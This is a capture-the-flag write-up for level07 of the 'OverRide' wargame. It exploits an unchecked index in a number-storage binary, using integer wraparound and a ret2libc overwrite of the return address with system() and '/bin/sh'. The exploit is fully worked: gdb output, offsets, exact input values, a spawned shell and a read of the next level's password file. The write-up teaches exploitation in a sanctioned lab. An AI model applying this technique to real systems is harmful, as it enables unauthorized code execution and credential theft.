# Level 07

Once logged in, you will see a binary.

```
$ ssh localhost -p 4242 -l level07
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on localhost:4242
level07@localhost's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
level07@OverRide:~$ ls
level07
```

Let's run the program.

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: aaaaaaaa
 Failed to do aaaaaaaa command
Input command: store
 Number: 1
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 1
 Completed read command successfully
Input command: quit
level07@OverRide:~$
```

The program seems to be a storage service, but it will not be efficient to do test all possible inputs manually, so let's see if there is another way to exploit it.

By decompiling the source we can see the program uses `memset()`, `puts()`, `printf()`, and `fgets()`, which gives us lots of options to use a buffer overflow attack. Functions `store_number()`, and `read_number()` are declared that should be investigated as well.

```
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x0804842c  _init
0x08048470  printf
0x08048470  printf@plt
0x08048480  fflush
0x08048480  fflush@plt
0x08048490  getchar
0x08048490  getchar@plt
0x080484a0  fgets
0x080484a0  fgets@plt
0x080484b0  __stack_chk_fail
0x080484b0  __stack_chk_fail@plt
0x080484c0  puts
0x080484c0  puts@plt
0x080484d0  __gmon_start__
0x080484d0  __gmon_start__@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  memset
0x080484f0  memset@plt
0x08048500  __isoc99_scanf
0x08048500  __isoc99_scanf@plt
0x08048510  _start
0x08048540  __do_global_dtors_aux
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
0x08048a00  __libc_csu_init
0x08048a70  __libc_csu_fini
0x08048a72  __i686.get_pc_thunk.bx
0x08048a80  __do_global_ctors_aux
0x08048aac  _fini
```

At this point, we realize that it'll be easier to use the program itself to modify the values instead of relying on another vulnerable function in the program. This is because there's a rather obtuse check of the index for numbers. Here's the `store_number` function:

```c
int store_number(int storage_offset) {
  uint user_value;
  uint user_index;

  printf(" Number: ");
  user_value = get_unum();
  printf(" Index: ");
  user_index = get_unum();
  if ((user_index % 3 == 0) || (user_value >> 0x18 == 0xb7)) {
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
  } else {
    *(uint *)(user_index * 4 + storage_offset) = user_value;
    return 0;
  }
}
```

There's no check if the index is within bounds (less than 100)! That said, there are two things to keep in mind when we're storing numbers in memory:
1. The user-provided index can't be a multiple of 3
2. The user-provided value can't fulfill the statement `(user_value >> 0x18 == 0xb7)`.

Using this vulnerability, we'll exploit the program by calling `system` with the argument `"/bin/sh"` when the `while` loop exits (with the `"quit"` command)

To change what happens when the program is finishing, the offset needs to be acquired. Instead of using the buffer overflow pattern generator, the offset can be found by putting a breakpoint before `store_number()` or `read_number()`, getting the `EIP` value, and subtracting the `EAX` address. _Keep in mind that these values may change between systems!_

```
gdb-peda$ disass main
[...]
   0x08048919 <+502>:	sub    cl,al
   0x0804891b <+504>:	mov    eax,ecx
   0x0804891d <+506>:	movsx  eax,al
   0x08048920 <+509>:	test   eax,eax
   0x08048922 <+511>:	jne    0x8048939 <main+534>
   0x08048924 <+513>:	lea    eax,[esp+0x24]
   0x08048928 <+517>:	mov    DWORD PTR [esp],eax
-> 0x0804892b <+520>:	call   0x80486d7 <read_number>	      # we want to break here
   0x08048930 <+525>:	mov    DWORD PTR [esp+0x1b4],eax
[...]
gdb-peda$ b *0x0804892b
Breakpoint 1 at 0x804892b
gdb-peda$ run
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: read

[----------------------------------registers-----------------------------------]
EAX: 0xffffd4f4 --> 0x0                            # return value of eax (beginning of stack)
EBX: 0xffffd4f4 --> 0x0
ECX: 0xffffd600 --> 0x0
EDX: 0xffffd600 --> 0x0
ESI: 0xffffd68c --> 0x0
EDI: 0x8048d65 --> 0x69757100 ('')
EBP: 0xffffd6b8 --> 0x0
ESP: 0xffffd4d0 --> 0xffffd4f4 --> 0x0
EIP: 0x804892b (<main+520>:	call   0x80486d7 <read_number>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048922 <main+511>:	jne    0x8048939 <main+534>
   0x8048924 <main+513>:	lea    eax,[esp+0x24]
   0x8048928 <main+517>:	mov    DWORD PTR [esp],eax
=> 0x804892b <main+520>:	call   0x80486d7 <read_number>
   0x8048930 <main+525>:	mov    DWORD PTR [esp+0x1b4],eax
   0x8048937 <main+532>:	jmp    0x8048965 <main+578>
   0x8048939 <main+534>:	lea    eax,[esp+0x1b8]
   0x8048940 <main+541>:	mov    edx,eax
Guessed arguments:
arg[0]: 0xffffd4f4 --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd4d0 --> 0xffffd4f4 --> 0x0            # return value of eax (beginning of stack)
0004| 0xffffd4d4 --> 0x14
0008| 0xffffd4d8 --> 0xf7fcfac0 --> 0xfbad2288
0012| 0xffffd4dc --> 0xf7fdc714 --> 0x20e28
0016| 0xffffd4e0 --> 0x98
0020| 0xffffd4e4 --> 0xffffffff
0024| 0xffffd4e8 --> 0xffffd7b8 --> 0x0
0028| 0xffffd4ec --> 0xffffd758 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804892b in main ()
gdb-peda$ info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x804892b in main; saved eip 0xf7e45513
 called by frame at 0xffffd730
 Arglist at 0xffffd6b8, args:
 Locals at 0xffffd6b8, Previous frame's sp is 0xffffd6c0
 Saved registers:
  ebx at 0xffffd6ac, ebp at 0xffffd6b8, esi at 0xffffd6b0, edi at 0xffffd6b4, eip at 0xffffd6bc
gdb-peda$ p/d 0xffffd6bc - 0xffffd4f4                                       # ^ here's EIP
$1 = 456
```

Now we know the stack is `456` bytes long. Since the storage buffer is storing integers, it is equivalent to `456 / 4 = 114` integers.

The modifications we'll need to make as part of the exploit are the following:
- Place `system` in the `EIP` register at index `114`
- Place `"/bin/sh"` as an argument to the `system` at index `116`

Unfortunately, the pesky conditional statement in `store_number` will cause issues when storing multiples of 3, so we'll use a wraparound to make the number `114` be stored when we enter something else entirely.

```
(UINT_MAX + 1) / 4 + 114 = 1073741938
(4294967295 + 1) / 4 + 114 = 1073741938
```

Now all we need to do is place our payload in memory by using `store` command of the program in order to call `system` with the argument `"/bin/sh"`. Here's the values of what we know so far:

| Pointer to | Integer value | Input index (what we'll enter) |
|------------|---------------|--------------------------------|
| `system()`   | `4159090384`    | `1073741938`                     |
| `"/bin/sh"`  | `4160264172`    | `116`                            |

Let's find where in memory to find the above items.

```
gdb-peda$ print system
$8 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$ find /bin/sh					     # NOTE: this works in peda only
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
```

And now we'll convert those memory addresses to integers.

```
level07@OverRide:~$ python
Python 2.7.3 (default, Jun 22 2015, 19:33:41)
[GCC 4.6.3] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0xf7e6aed0
4159090384
>>> 0xf7f897ec
4160264172
```

We now have all the information we need to exploit the program. Here's a quick summary of the values we'll be using:

| Pointer to | Pointer value | Integer value (the input) | Index in buffer (100 `int`s long) | Input index (the input) |
|------------|---------------|---------------|-----------------------------------|--------------------------------|
| system()   | `0xf7e6aed0`  | 4159090384    | 114                               | 1073741938                     |
| "/bin/sh"  | `0xf7f897ec`  | 4160264172    | 116                               | 116                            |

At long last, here's the exploit in action.

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
